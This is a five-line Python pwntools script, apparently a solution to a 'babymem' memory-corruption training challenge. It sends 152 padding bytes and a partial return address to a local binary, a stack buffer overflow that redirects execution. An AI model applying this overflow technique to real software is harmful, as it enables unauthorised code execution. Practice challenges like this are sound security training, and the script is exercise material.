import pwn
r = pwn.process("/challenge/babymem_level3.1")
r.sendline("1024")
r.send(b'\x00'*152+b'\x42\x19\x40')
print(r.readall())
